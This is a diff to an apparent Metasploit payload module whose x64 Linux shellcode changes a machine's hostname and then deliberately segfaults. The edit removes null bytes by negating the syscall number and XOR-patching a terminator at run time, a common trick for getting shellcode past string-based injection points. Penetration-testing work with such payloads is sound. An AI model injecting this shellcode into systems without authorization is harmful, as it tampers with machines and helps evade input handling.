@@ -4,7 +4,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = 25
+  CachedSize = 33
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -38,20 +38,22 @@ module MetasploitModule
     end
 
     payload = %^
-      push 170 ; sethostname() syscall number.
+      push 0xffffffffffffff56 ; sethostname() syscall number.
       pop rax
+      neg rax
       jmp str
 
     end:
       push #{length}
       pop rsi
       pop rdi    ; rdi points to the hostname string.
+      xor byte [rdi+rsi], 0x41
       syscall
       ret        ; break the loop by causing segfault.
 
     str:
       call end
-      db "#{hostname}"
+      db "#{hostname}A"
     ^
 
     Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
